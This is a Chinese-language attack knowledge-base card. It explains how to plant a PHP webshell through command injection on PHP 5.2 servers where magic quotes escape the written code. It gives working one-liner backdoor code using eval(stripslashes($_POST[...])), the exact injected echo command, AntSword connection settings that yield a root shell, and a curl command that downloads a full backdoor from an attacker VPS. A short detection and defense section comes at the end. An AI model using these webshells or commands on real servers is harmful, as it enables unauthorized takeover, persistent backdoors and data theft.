---
id: web-php-rce-magic-quotes-stripslashes-webshell-write-bypass
title: PHP 5.2 魔术引号环境写 WebShell：写入内容被自动转义时用 stripslashes($_POST[...]) 让蚁剑连通
type: scenario
domain: web
path: web/php/rce
technique: magic-quotes-stripslashes-webshell-write
tags:
- web
- php
- rce
- webshell
- magic-quotes
- stripslashes
- eval
- antsword
- escaping
- php5.2
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-T1-4
  verified_at: '2026-11-07T21:49:00+08:00'
  notes: 已对照原文及 25 张图核对；图13 phpinfo 显示 PHP Version 5.2.17 及多条 Unexpected character in input 警告、图17/19 落盘一句话木马被反斜杠转义、图20 访问 3.php 仍报警告、图21 蚁剑对 3.php 显示绿色『成功 连接成功!』、图23 root 终端，stripslashes 写马绕过链已打通，非 DoS/半链；confidence medium 合理(Warning 不致命 + stripslashes 作用于运行时 POST 为基于截图的推断，作者未给源码级确认)；dedup 除自身外候选(帝国CMS .mod 导入、加密马、RSA 流量编码器等)均不同链；affected_versions 核对结论：原文第89/117行与图13 表明 PHP 5.2.17 是这台目标设备 phpinfo 的环境版本(原文措辞『当前的 php 版本为 5.2』)，『5.3.0 起默认禁用/5.4.0 移除』是 magic_quotes_gpc 配置项通用历史说明，原文未以受影响版本/区间形式明确标注该场景影响范围，属 brief『只是目标环境版本』，故 set-versions --clear 清除；版本信息仍完整保留在正文『触发条件』，不损失知识；路径 web/php/rce 合法、frontmatter 无 sources 违规字段；未验证点：未独立复现、转义来源无 CGI 源码级确认、其它 4 种绕过写法原文明确未成功
url: /docs/web/php/rce/web-php-rce-magic-quotes-stripslashes-webshell-write-bypass/
draft: false
kb_aliases:
- magic_quotes_gpc 绕过
- stripslashes 写马
- PHP 5.2 一句话木马
- 自动转义绕过
- 蚁剑连接成功但页面报 Warning
---

## 一句话结论

在 PHP 5.2（magic_quotes_gpc 默认开启）环境里通过命令注入往 Web 目录写一句话木马时，写入命令串中的单引号、括号、分号等会被自动加上反斜杠，落盘文件里出现 `\(`, `\[`, `\'`，导致 `<?php @eval($_POST['love']); ?>` 报 `Unexpected character in input: '\'` 警告、蚁剑"返回数据为空"；把木马改成 `<?php @eval(stripslashes($_POST['love'])); ?>` 后，虽然 `cat` 仍能看到转义、访问仍报同样警告，蚁剑却能"连接成功"并取得 root 终端。

## 原理

- **转义来源**：PHP 5.2 及更早版本默认开启 `magic_quotes_gpc`，会自动给请求数据中的引号、反斜杠等加反斜杠；同时在这条命令注入链里，CGI 把解码后的命令串交给 shell 时也对 `(`、`[`、`'`、`;` 等特殊字符做了转义，于是 `echo "<?php @eval($_POST['love']); ?>" > 8.php` 落盘后变成 `<?php eval\($_POST\[\'love\'\]\)\; ?>`。
- **为什么"有反斜杠还能执行"**：PHP 5.2 的词法分析遇到非法字符 `\` 只发出 `Warning: Unexpected character in input: '\' (ASCII=92) state=1` 并跳过该字符，而不是 Fatal error，所以页面虽有大量告警，解析后的代码仍可继续执行。这解释了"访问仍报错却能连通"的表象。
- **`stripslashes()` 的真正作用**：蚁剑/菜刀发来的 `$_POST['love']` 是一段 PHP 代码，若 `magic_quotes_gpc` 在运行时给它加上反斜杠，`eval($_POST['love'])` 收到的就是被污染、可能语法错误的内容，连接自然失败；`stripslashes()` 先去掉运行时自动加上的反斜杠，把干净的 payload 交给 `eval`，客户端即可正常通信。
- **为什么其它"免杀"写法都不行**：作者尝试 `base64_decode($_POST['cmd'])`、`chr()` 逐字符拼接、`call_user_func("ev"."al", ...)`、双重 `str_replace()` 等均未绕过成功——它们只改变木马外观，没有解决运行时请求数据被转义这一根因；只有针对转义本身的 `stripslashes()` 生效。
- **完整性**：链路已打通（蚁剑连接成功、拿到 `/var/www/cgi-bin/` 文件列表与 root 终端）并有多张截图验证，属于完整可用的写马绕过场景。
- **不确定处**：文章只从现象归因于"魔术引号"，未给出 CGI 源码级的转义来源确认；上面对"Warning 不致命 + stripslashes 作用于运行时 POST 数据"的解释是基于截图的推断，故 `confidence` 标 medium。

## 触发条件

- 目标 Web 环境为 PHP 5.2.x（`magic_quotes_gpc` 默认开启；5.3.0 起默认禁用、5.4.0 移除）。
- 已具备向 Web 目录写入 `.php` 文件的能力（如命令注入/任意文件写），但写入链路会对命令串里的特殊字符自动加反斜杠。
- 写入目录可被 Web 服务器以 PHP 解析，且攻击者能访问该 URL。
- 使用蚁剑/菜刀等通过 POST 传 PHP 代码的客户端（连接密码如 `love`）。

## 利用步骤

1. 先写 `phpinfo()` 文件并访问，确认 PHP 版本（本例为 5.2.17），据此判断魔术引号默认开启。
2. 写入普通一句话木马（命令中空格用 tab 替换、整体 base64 编码后注入），如 `echo\t"\t<?php\t@eval($_POST['love']);\t?>"\t>\t8.php`。
3. `cat 8.php` 发现单引号/括号/分号被转义，访问报多条 `Unexpected character in input: '\'` 警告，蚁剑配置 URL + 密码后"返回数据为空"，连接失败。
4. 改写为 `stripslashes` 版本：`echo\t"\t<?php\t@eval(stripslashes($_POST['love']));\t?>"\t>\t3.php`，同样 base64 编码注入。
5. 蚁剑重新配置 `3.php`、连接密码 `love`、类型 PHP，`测试连接` 返回"连接成功!"；随后可浏览目录、打开终端（`id` 显示 `uid=0(root)`）。
6. 若仍无法连通，可用命令注入改下载功能完整的大马到 Web 目录作为兜底。

## PoC

```php
// 失败：落盘后被转义
<?php @eval($_POST['love']); ?>
// 实际文件内容（cat 可见）
<?php eval\($_POST\[\'love\'\]\)\; ?>

// 成功：stripslashes 去掉运行时转义
<?php @eval(stripslashes($_POST['love'])); ?>
```

写入命令（tab 为实际制表符，整条命令 base64 后作为注入点的 `system` 参数）：

```
echo	"	<?php	@eval(stripslashes($_POST['love']));	?>"	>	3.php
```

蚁剑配置：URL 指向 `3.php`，连接密码 `love`，编码 UTF8，连接类型 PHP，测试连接即成功。无自动化利用脚本（依赖已有的写文件入口）。

## 变体与关联

- **已验证失败的写法（勿重复踩坑）**：`eval(base64_decode($_POST['cmd']))`、`chr()` 逐字符拼接 `system(...)`、`call_user_func("ev"."al", $_POST['cmd'])`、双重 `str_replace()` 混淆——原文逐一尝试均"没有绕过成功"。
- **组合**：与命令注入里的空格过滤绕过（用 tab 替换空格）配套使用；本卡解决的是"内容被转义"，前者解决的是"命令被过滤"。
- **兜底**：只能写文件、无法回显命令时，下载完整大马（如 `curl\tvps_ip:8000/qsd-php-backdoor.php\t-o\ttheme-config.php`）提供目录遍历、MySQL 查询与命令执行。
- **关联**：与 [[iot-dlink-nas-sharing-cgi-messagebus-backdoor-base64-system-rce]] 为同一实战链的前后两段；与"加密/免杀 WebShell"（冰蝎、Behinder）目的不同——此处对抗的是自动转义而非查杀。

## 检测与防御

- **升级 PHP**：升至 5.4 及以上，彻底移除 `magic_quotes_gpc`；老环境显式关闭 `magic_quotes_gpc`。
- **写入防护**：Web 目录禁止运行账号写入，或写入与脚本执行目录分离；对新增 `.php` 做文件完整性监控与内容扫描（关注 `eval`、`stripslashes`、`$_POST` 组合）。
- **命令层**：修复上游命令注入，禁止把用户输入拼进 shell；同时过滤空白字符变体，避免 tab 等绕过。
- **运行时**：禁用 `eval` 等危险函数（`disable_functions`）、开启 `open_basedir` 限制、最小权限运行 Web 服务，降低 WebShell 危害。
- **检测**：WAF/IDS 拦截含 `eval`/`stripslashes`/`$_POST` 的写入请求；监控访问时产生大量 `Unexpected character in input: '\'` 告警的 php 文件与异常 POST 流量。
